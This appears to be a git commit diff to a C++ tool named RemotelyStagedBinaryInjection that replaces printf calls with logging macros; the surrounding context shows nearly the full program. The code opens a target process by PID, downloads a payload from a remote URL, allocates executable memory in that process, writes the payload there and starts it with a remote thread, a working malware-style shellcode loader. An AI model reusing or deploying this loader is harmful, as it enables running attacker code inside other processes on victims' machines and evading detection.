266edf3e210790374c7f0d43e2a97f466da9c45e
notsido <sido6232@protonmail.ch>
2024-04-08 18:18:25 +0200

    improved debugging messages, thank you froj!

--- RemotelyStagedBinaryInjection/RemotelyStagedBinaryInjection.cpp
+++ RemotelyStagedBinaryInjection/RemotelyStagedBinaryInjection.cpp
@@ -1,6 +1,7 @@
 #include <Windows.h>
 #include <wininet.h>
 #include <stdio.h>
+#include "debug.h"
 
 const char* s = "[+]";
 const char* f = "[-]";
@@ -24,47 +25,47 @@ int main(int argc, char* argv[]) {
 
 
 	if (argc < 2) {
-		printf("%s Not enough arguments!", f);
+		LOG_ERROR("Not enough arguments!");
 
 		return 1;
 	}
 
 	PID = atoi(argv[1]);
-	printf("%s attempting to open a handle to the provided process (%ld)\n", w, PID);
+	LOG_INFO("attempting to open a handle to the provided process (%ld)", PID);
 
 
 	// open a handle to the provided process
 	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
 
 	if (hProcess == NULL) {
-		printf("%s could not open a handle to the provided process... Error: %ld", f, GetLastError());
+		LOG_ERROR("could not open a handle to the provided process... Error: %ld", GetLastError());
 		return 1;
 	}
 
-	printf("%s successfully opened a handle to the provided process!\n\\---0x%p\n", s, hProcess);
+	LOG_SUCCESS("successfully opened a handle to the provided process!\n\\---0x%p", hProcess);
 
 	// open handle to WinInet
 	hInet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
 
 	if (hInet == NULL) {
-		printf("%s could not open a handle to hInet... Error: %ld", f, GetLastError());
+		LOG_ERROR("could not open a handle to hInet... Error: %ld", GetLastError());
 		CloseHandle(hProcess);
 		return 1;
 	}
 
-	printf("%s successfully opened a handle to WinInet!\n", s);
+	LOG_SUCCESS("successfully opened a handle to WinInet!");
 
 	// open handle to payload's URL
 	hURL = InternetOpenUrlW(hInet, sourceURL, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
 
 	if (hURL == NULL) {
-		printf("%s could not open a handle to URL... Error: %ld", f, GetLastError());
+		LOG_ERROR("could not open a handle to URL... Error: %ld", GetLastError());
 		CloseHandle(hProcess);
 		CloseHandle(hInet);
 		return 1;
 	}
 
-	printf("%s successfully opened a handle to the provided URL!\n", s);
+	LOG_SUCCESS("successfully opened a handle to the provided URL!");
 
 	// allocate 1024 bytes to temporary buffer
 	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
@@ -77,13 +78,13 @@ int main(int argc, char* argv[]) {
 		CloseHandle(hProcess);
 	}
 
-	printf("%s successfully allocated memory to temp buffer!\n\\---0x%p\n", s, pTmpBytes);
+	LOG_SUCCESS("successfully allocated memory to temp buffer!\n\\---0x%p", pTmpBytes);
 
 	// read data
 	while (TRUE) {
 		// read 1024 bytes to temp buffer
 		if (!InternetReadFile(hURL, pTmpBytes, 1024, &dwBytesRead)) {
-			printf("%s could not read contents of specified file... Error: %ld\n", f, GetLastError());
+			LOG_ERROR("could not read contents of specified file... Error: %ld", GetLastError());
 			LocalFree(pTmpBytes);
 			InternetCloseHandle(hURL);
 			CloseHandle(hInet);
@@ -124,53 +125,53 @@ int main(int argc, char* argv[]) {
 	pPayloadBytes = (PBYTE*)malloc(sSize);
 	if (pPayloadBytes != NULL) {
 		memcpy(pPayloadBytes, pBytes, sSize);
-		printf("%s payload initialised\n\---0x%p", s, pPayloadBytes);
+		LOG_SUCCESS("payload initialised\n\\---0x%p", pPayloadBytes);
 	}
 
 	// allocate memory for size
 	sPayloadBytes = (size_t*)malloc(sizeof(size_t));
 	if (sPayloadBytes != NULL) {
 		*sPayloadBytes = sSize;
-		printf("%s payload size initialised\n", s);
+		LOG_SUCCESS("payload size initialised");
 	}
 
 
 	// clean up
-	printf("%s closing previously created inet handles and freeing memory\n", w);
+	LOG_INFO("closing previously created inet handles and freeing memory\n");
 	InternetCloseHandle(hInet);
 	InternetCloseHandle(hURL);
 	InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
 	LocalFree(pTmpBytes);
 	LocalFree(pBytes);
-	printf("%s success\n", s);
+	LOG_SUCCESS("success\n");
 
 	// allocate bytes in the memory of the specified process
 	rBuffer = VirtualAllocEx(hProcess, NULL, sSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
 	if (rBuffer == NULL) {
-		printf("%s could not allocate memory in host process... Error: %ld", f, GetLastError());
+		LOG_ERROR("could not allocate memory in host process... Error: %ld", GetLastError());
 		CloseHandle(hProcess);
 		free(pPayloadBytes);
 		free(sPayloadBytes);
 		return 1;
 	}
 	else {
-		printf("%s allocated buffer in specified process\n", s);
+		LOG_SUCCESS("allocated buffer in specified process");
 	}
 
 	// actually write to the memory of the specified process
 	if (pPayloadBytes != NULL and sPayloadBytes != NULL) {
 		WriteProcessMemory(hProcess, rBuffer, pPayloadBytes, *sPayloadBytes, NULL);
-		printf("%s successfully wrote %zu-bytes to memory of specified process\n", s, sSize);
+		LOG_SUCCESS("successfully wrote %zu-bytes to memory of specified process", sSize);
 	}
 	// create thread to run the payload
 	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);
 
 	if (hThread != NULL) {
-		printf("%s successfully opened a handle to created thread! (%ld)\n\\---0x%p\n", s, TID, hThread);
+		LOG_ERROR("successfully opened a handle to created thread! (%ld)\n\\---0x%p", TID, hThread);
 	}
 	else {
-		printf("%s could not open a handle to thread... Error: %ld", f, GetLastError());
+		LOG_ERROR("could not open a handle to thread... Error: %ld", GetLastError());
 		CloseHandle(hProcess);
 		VirtualFree(rBuffer, 0, MEM_RELEASE);
 		free(pPayloadBytes);
@@ -179,7 +180,7 @@ int main(int argc, char* argv[]) {
 	}
 
 	WaitForSingleObject(hThread, INFINITE);
-	printf("%s thread finished executing, cleaning up...\n", s);
+	LOG_SUCCESS("thread finished executing, cleaning up...");
 
 	// clean up after yourself!
 	CloseHandle(hProcess);
@@ -187,7 +188,7 @@ int main(int argc, char* argv[]) {
 	VirtualFree(rBuffer, 0, MEM_RELEASE);
 	free(pPayloadBytes);
 	free(sPayloadBytes);
-	printf("%s closed handle to process", s);
+	LOG_SUCCESS("closed handle to process");
 
 	return 0;
 }
